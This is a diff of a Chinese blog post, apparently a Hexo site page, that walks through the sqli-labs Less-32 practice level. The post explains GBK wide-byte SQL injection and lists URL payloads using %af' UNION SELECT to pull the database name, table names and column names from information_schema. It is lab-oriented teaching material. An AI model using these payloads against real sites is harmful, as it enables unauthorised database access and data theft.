@@ -79,24 +79,24 @@
 
 
 
-<meta name="description" content="一 确定注入点和注入类型经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？     这里，就不得不说说sql注入的一种，宽字符注入 二 什么是宽字符注入 在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将">
+<meta name="description" content="一 确定注入点和注入类型经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？   这里，就不得不说说sql注入的一种，宽字符注入 二 什么是宽字符注入 在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs less32通关解析">
 <meta property="og:url" content="http://forcaker.github.io/2019/10/18/通关解析/index.html">
 <meta property="og:site_name" content="白凡的一页书">
-<meta property="og:description" content="一 确定注入点和注入类型经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？     这里，就不得不说说sql注入的一种，宽字符注入 二 什么是宽字符注入 在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将">
+<meta property="og:description" content="一 确定注入点和注入类型经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？   这里，就不得不说说sql注入的一种，宽字符注入 二 什么是宽字符注入 在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://forcaker.github.io/.com//10/18/通关解析/1.png">
-<meta property="og:image" content="http://forcaker.github.io/.com//2.png">
-<meta property="og:image" content="http://forcaker.github.io/.com//3.png">
-<meta property="og:image" content="http://forcaker.github.io/.com//4.png">
-<meta property="og:image" content="http://forcaker.github.io/.com//5.png">
-<meta property="og:image" content="http://forcaker.github.io/.com//6.png">
-<meta property="og:updated_time" content="2019-10-18T07:19:49.296Z">
+<meta property="og:image" content="http://forcaker.github.io/.io//1.png">
+<meta property="og:image" content="http://forcaker.github.io/.io//2.png">
+<meta property="og:image" content="http://forcaker.github.io/.io//3.png">
+<meta property="og:image" content="http://forcaker.github.io/.io//4.png">
+<meta property="og:image" content="http://forcaker.github.io/.io//5.png">
+<meta property="og:image" content="http://forcaker.github.io/.io//6.png">
+<meta property="og:updated_time" content="2019-10-18T07:24:38.789Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs less32通关解析">
-<meta name="twitter:description" content="一 确定注入点和注入类型经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？     这里，就不得不说说sql注入的一种，宽字符注入 二 什么是宽字符注入 在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将">
-<meta name="twitter:image" content="http://forcaker.github.io/.com//10/18/通关解析/1.png">
+<meta name="twitter:description" content="一 确定注入点和注入类型经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？   这里，就不得不说说sql注入的一种，宽字符注入 二 什么是宽字符注入 在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除">
+<meta name="twitter:image" content="http://forcaker.github.io/.io//1.png">
 
 
 
@@ -368,8 +368,7 @@
 
       
         <h1 id="一-确定注入点和注入类型"><a href="#一-确定注入点和注入类型" class="headerlink" title="一 确定注入点和注入类型"></a>一 确定注入点和注入类型</h1><p>经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？</p>
-  <img src="/.com//10/18/通关解析/1.png" title="This is an example image">
-
+<p> <img src="/.io//1.png" alt="1"></p>
 <p>这里，就不得不说说sql注入的一种，宽字符注入</p>
 <h1 id="二-什么是宽字符注入"><a href="#二-什么是宽字符注入" class="headerlink" title="二 什么是宽字符注入"></a>二 什么是宽字符注入</h1><ol>
 <li><p>在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性，宽字节注入与HTML页面编码是无关的。</p>
@@ -380,7 +379,7 @@
 </li>
 </ol>
 <h1 id="三-思路"><a href="#三-思路" class="headerlink" title="三 思路"></a>三 思路</h1><p>  既然单引号已被过滤，且呈&#39;显示，那么我们就要想办法使其后面的’生效，先看看url编码后的情况，urlencode(&#39;)=%5c%27,那么，我们需要在%5c的前面加上%df，前面提到的GBK编码方式就会将%df%5c当成是一个汉字，从而使%27脱离出来，也就达到了我们的目的</p>
-<h1 id="四-实践"><a href="#四-实践" class="headerlink" title="四 实践"></a>四 实践</h1><p>  先进行试错测试，看看错误返回    ?id=1%af’<br>  <img src="/.com//2.png" alt="2"><br>确定是单引号闭合，按照步骤，应该是先测试有几个字段，由于是靶场环境，已经颇为熟悉，直接进入到联合查询看看有无显示位  ?id=999%af’ union select 1,2,3 –+<br><img src="/.com//3.png" alt="3"><br>有两个显示位，那么直接爆库  ?id=999%af’ union select 1,2,database() –+<br>  <img src="/.com//4.png" alt="4"><br>再爆表  ?id=999%af’ union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database()) –+<br>  <img src="/.com//5.png" alt="5"><br>在下一步爆字段的时候，由于需要引用表名，而引用表名的话则需要加上引号，这就又得想办法绕过，没关系，我们再加个子查询便是 ?id=999%af’ union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=(select (table_name)from information_schema.tables where table_schema=database() limit 3,1)) –+<br>  <img src="/.com//6.png" alt="6"><br>接下来就不用再演示了</p>
+<h1 id="四-实践"><a href="#四-实践" class="headerlink" title="四 实践"></a>四 实践</h1><p>  先进行试错测试，看看错误返回    ?id=1%af’<br>  <img src="/.io//2.png" alt="2"><br>确定是单引号闭合，按照步骤，应该是先测试有几个字段，由于是靶场环境，已经颇为熟悉，直接进入到联合查询看看有无显示位  ?id=999%af’ union select 1,2,3 –+<br><img src="/.io//3.png" alt="3"><br>有两个显示位，那么直接爆库  ?id=999%af’ union select 1,2,database() –+<br>  <img src="/.io//4.png" alt="4"><br>再爆表  ?id=999%af’ union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database()) –+<br>  <img src="/.io//5.png" alt="5"><br>在下一步爆字段的时候，由于需要引用表名，而引用表名的话则需要加上引号，这就又得想办法绕过，没关系，我们再加个子查询便是 ?id=999%af’ union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=(select (table_name)from information_schema.tables where table_schema=database() limit 3,1)) –+<br>  <img src="/.io//6.png" alt="6"><br>接下来就不用再演示了</p>
 
       
     </div>
